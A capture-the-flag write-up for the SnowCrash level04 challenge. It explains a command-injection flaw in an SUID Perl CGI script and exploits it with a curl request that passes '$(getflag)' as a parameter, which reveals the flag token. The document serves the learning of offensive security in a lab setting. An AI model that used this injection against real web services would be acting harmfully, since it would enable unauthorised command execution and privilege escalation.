1. **Searching for files**

    We found another file with SUID permissions:
    ```bash
    level04@SnowCrash:~$ ll
    [...]
    -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl*
    [...]
    ```  
    Using the `strings` command, we found that this is a Perl script functioning as a CGI (Common Gateway Interface) web application and has a `command injection` vulnerability:
    ```bash
    level04@SnowCrash:~$ strings level04.pl 
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
    x(param("x"));
    ```   
    `localhost:4747`: Suggests that this script runs on a local web server on port 4747.
    `Vulnerable function`: Defines a function `x` that takes an argument, stores it in `$y`, and executes the command `echo $y 2>&1` using backticks (`), which allow shell command execution.

2. **Exploitation**

    This command injection vulnerability is straightforward to exploit. Since the script runs with the permissions of the `flag04` user (due to the SUID bit) and uses unsanitized user input in a shell command, we can inject our own commands.
    - Check if the web server is running:
    ```bash
    level04@SnowCrash:~$ netstat -tuln | grep 4747
    tcp6       0      0 :::4747                 :::*                    LISTEN  
    ```  
    Next, inject the `getflag` command:
    ```bash
    level04@SnowCrash:~$ curl 'http://localhost:4747/?x=$(getflag)'
    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
    ```



